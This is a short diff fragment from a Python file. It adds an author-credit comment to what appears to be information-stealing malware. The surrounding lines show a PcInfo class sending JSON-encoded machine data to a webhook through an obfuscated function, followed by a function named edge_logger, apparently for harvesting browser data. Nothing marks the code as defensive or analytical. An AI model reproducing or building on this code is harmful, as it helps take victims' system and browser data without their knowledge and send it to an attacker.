@@ -953,6 +953,7 @@ class PcInfo:
             }
     L04DUr118(hook, data=dumps(data).encode(), headers=headers)
 
+# MADE BY 0x77ff | Thank you.
 
 def edge_logger():
     try:
